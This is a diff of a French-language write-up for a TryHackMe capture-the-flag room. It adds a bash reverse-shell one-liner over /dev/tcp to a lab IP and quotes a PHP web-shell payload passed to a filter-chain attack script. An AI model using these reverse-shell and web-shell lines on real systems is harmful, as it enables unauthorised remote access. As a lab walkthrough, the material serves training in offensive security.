@@ -25,6 +25,14 @@ Lien de la room: [TryHackMe | Chese CTF](https://tryhackme.com/room/cheesectfv10
 1. Créer un fichier `shell.sh` pour mon script de reverse shell. On veut donc initier la connexion depuis la machine cible.
     
 
+Remplacer 10.10.102.158 par l’adresse IP de votre machine.
+
+```bash
+cat shell.sh 
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.102.158/4444 0>&1
+```
+
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746544143626/615e08b3-a3e5-4eaa-91cc-19bea55574bf.png align="center")
 
 2. Démarrer le listener netcat sur la machine principale pour écouter les connexions entrantes sur le port 4444
@@ -45,7 +53,7 @@ python -m http.server 8000
     
 
 ```bash
-python3 attack.py --chain '<?php system($_GET["cmd"]); ?>' 
+python3 attack.py --chain '<?php system($_GET["cmd"]); ?>'
 ```
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746544061591/53a75b57-8673-40b2-855d-4f3f19525946.png align="center")
@@ -87,5 +95,11 @@ Ce payload utilise la syntaxe courte `<?= ?>` pour exécuter la commande `curl` 
 Une fois la chaîne de filtres générée, on peut l’intégrer dans l’URL et obtenir l’accès sur la machine en reverse shell.
 
 # Flag user.txt
+
+On veut lire le contenu du fichier user.txt
+
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746637426433/df5bbc2e-1837-4ed3-84ee-beb3dba45cb0.png align="center")
+
+Il faut donc trouver un moyen de pouvoir lire le contenu du fichier `user.txt`. Seul le propriétaire `comte` a le droit de lire et écrire dans le fichier. Vu qu’on est connecté à `www-data`, on a aucun droit.
 
 # Flag root.txt
